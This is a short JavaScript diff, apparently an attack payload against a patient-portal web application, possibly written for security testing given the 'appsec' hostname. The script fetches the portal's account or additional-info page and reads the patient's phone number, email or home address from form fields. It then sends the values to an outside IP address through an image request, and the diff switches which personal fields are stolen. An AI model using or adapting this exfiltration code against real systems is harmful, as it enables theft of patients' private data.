@@ -4,14 +4,14 @@ req.onreadystatechange = function () {
 if (req.readyState == 4 && req.status == 200 )
  {
  
- var phoneno = document.getElementById("per_CellPhone").value;
+ var phoneno = document.getElementById("con1_homephone").value;
  
- var email = document.getElementById("per_email").value;
+ var address = document.getElementById("addi_address1").value;
  
- new Image().src = "https://172.105.54.23:443/?email="+email+"&phoneno"+phoneno;
+ new Image().src = "https://172.105.54.23:443/?address="+address+"&phoneno"+phoneno;
 
  }
 };
 
-req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/personalInfo_New.jsp?mainNav=Account&pgId=personalInfo_New&act=0", true);
+req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/additionalInfo_New.jsp", true);
 req.send();
